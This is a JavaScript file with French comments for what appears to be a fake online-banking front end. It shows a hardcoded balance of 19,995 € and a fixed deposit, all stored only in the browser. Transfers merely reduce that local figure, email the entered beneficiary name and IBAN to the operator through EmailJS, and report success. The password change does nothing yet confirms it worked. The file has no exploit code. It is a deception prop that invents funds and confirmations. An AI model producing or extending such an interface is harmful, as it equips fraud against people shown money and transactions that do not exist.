// ============================================================
// 1. CONFIGURATION INITIALE ET MÉMOIRE
// ============================================================

// 1. On charge le solde (soit mémoire, soit défaut 42 000)


let solde = localStorage.getItem('mon_solde') 
            ? parseFloat(localStorage.getItem('mon_solde')) 
            : 19995.00;

// 2. On charge l'historique (soit mémoire, soit tableau vide)
let transactions = localStorage.getItem('mes_transactions')
                   ? JSON.parse(localStorage.getItem('mes_transactions'))
                   : [];

(function() {
    // Initialisation EmailJS
    emailjs.init("qxKUMUEPAPu1tGGdW");
    
    // Au démarrage, on affiche le solde et l'historique sauvegardés
    updateSoldeDisplay();
    renderHistory();
})();

// ============================================================
// 2. NAVIGATION ENTRE LES PAGES
// ============================================================

function showPage(pageId, navId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const targetPage = document.getElementById(pageId);
    if (targetPage) targetPage.classList.add('active');
    
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    const targetNav = document.getElementById(navId);
    if (targetNav) targetNav.classList.add('active');
}

// ============================================================
// 3. GESTION DES ONGLETS
// ============================================================

function switchTab(type) {
    const isHist = (type === 'historique');
    document.getElementById('view-historique').style.display = isHist ? 'block' : 'none';
    document.getElementById('view-avenir').style.display = isHist ? 'none' : 'block';
    document.getElementById('tab-hist').classList.toggle('active', isHist);
    document.getElementById('tab-aven').classList.toggle('active', !isHist);
}

// ============================================================
// 4. LOGIQUE DE VIREMENT (Solde + Code + Historique)
// ============================================================

function confirmPayment() {
    // 1. On récupère les valeurs
    const name = document.getElementById('pay-name').value.trim();
    const iban = document.getElementById('pay-iban').value.trim();
    const secureCode = document.getElementById('pay-code').value.trim();
    const amountInput = document.getElementById('pay-amount').value;
    const amount = parseFloat(amountInput);

    // 2. Vérifications de sécurité
    if (name === "" || iban === "" || isNaN(amount) || amount <= 0) {
        alert("⚠️ Veuillez remplir correctement tous les champs.");
        return;
    }

    // Vérification du code (longueur minimale 4)
    if (secureCode.length < 4) {
        alert("⚠️ Code de sécurité invalide ou manquant !");
        return;
    }

    if (amount > solde) {
        alert("⛔ Fonds insuffisants ! Vous ne pouvez pas virer plus que votre solde.");
        return;
    }

    // 3. LE CALCUL
    solde = solde - amount;
    
    // 4. SAUVEGARDE SOLDE
    localStorage.setItem('mon_solde', solde);

    // 5. AJOUT DANS L'HISTORIQUE ET SAUVEGARDE
    const newTransaction = {
        label: `Virement vers ${name}`,
        amount: -amount,
        type: 'negative'
    };
    // On ajoute au début du tableau
    transactions.unshift(newTransaction);
    // On sauvegarde le tableau
    localStorage.setItem('mes_transactions', JSON.stringify(transactions));

    // 6. Mise à jour de l'écran
    updateSoldeDisplay();
    renderHistory();

    // 7. Envoi de l'email (EmailJS)
    const templateParams = {
        beneficiary_name: name,
        iban: iban,
        amount: amount.toFixed(2),
        date: new Date().toLocaleDateString('fr-FR')
    };

    emailjs.send('service_hhzg4pg', 'template_q5mibvf', templateParams)
        .then(function() {
            alert(`✅ Virement de ${formatMoney(amount)} effectué !\nNouveau solde : ${formatMoney(solde)}`);
            
            // Nettoyage complet
            document.getElementById('pay-name').value = "";
            document.getElementById('pay-iban').value = "";
            document.getElementById('pay-code').value = "";
            document.getElementById('pay-amount').value = "";
            
            showPage('page-comptes', 'btn-nav-comptes');

        }, function(error) {
            alert("Virement validé, mais erreur d'envoi mail.");
            document.getElementById('pay-code').value = ""; // On vide quand même le code
            showPage('page-comptes', 'btn-nav-comptes');
        });
}

// ============================================================
// 5. FONCTIONS D'AFFICHAGE (Moteur graphique)
// ============================================================

function updateSoldeDisplay() {
    const soldeElement = document.getElementById('solde-text');
    soldeElement.innerText = formatMoney(solde);
}

function formatMoney(amount) {
    return amount.toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " €";
}

// Fonction qui redessine tout l'historique depuis la mémoire
function renderHistory() {
    const historyContainer = document.getElementById('view-historique');
    let htmlContent = `<div class="date-label">Opérations récentes</div>`;

    // 1. On affiche les nouvelles transactions stockées
    transactions.forEach(t => {
        htmlContent += `
            <div class="transaction">
                <div class="icon-circle" style="background-color: #eee;">📤</div>
                <div class="details">${t.label}</div>
                <div class="amount ${t.type}">${formatMoney(t.amount)}</div>
            </div>
        `;
    });

    // 2. On affiche l'ancienne transaction fixe (Dépot) à la fin
    htmlContent += `
        <div class="date-label"> Aujourd'hui </div>
        <div class="transaction">
            <div class="icon-circle energy">💶</div>
            <div class="details">Dépôt</div>
            <div class="amount positive">+ 19995,00 €</div>
        </div>
    `;

    historyContainer.innerHTML = htmlContent;
}

// ============================================================
// 6. SÉCURITÉ (Changement de mot de passe)
// ============================================================

function changePassword() {
    const oldPass = document.getElementById('old-pass').value;
    const newPass = document.getElementById('new-pass').value;

    if (oldPass === "" || newPass === "") {
        alert("⚠️ Veuillez remplir les deux champs de mot de passe.");
        return;
    }

    alert("✅ Sécurité mise à jour !\nVotre mot de passe a bien été modifié.");
    
    document.getElementById('old-pass').value = "";
    document.getElementById('new-pass').value = "";
    showPage('page-comptes', 'btn-nav-comptes');
}

function togglePasswordMenu() {
    const content = document.getElementById('password-accordion');
    const arrow = document.getElementById('pass-arrow');

    if (content.style.display === "none") {
        content.style.display = "block";
        arrow.style.transform = "rotate(180deg)"; // La flèche pointe vers le haut
    } else {
        content.style.display = "none";
        arrow.style.transform = "rotate(0deg)"; // La flèche revient vers le bas
    }
}




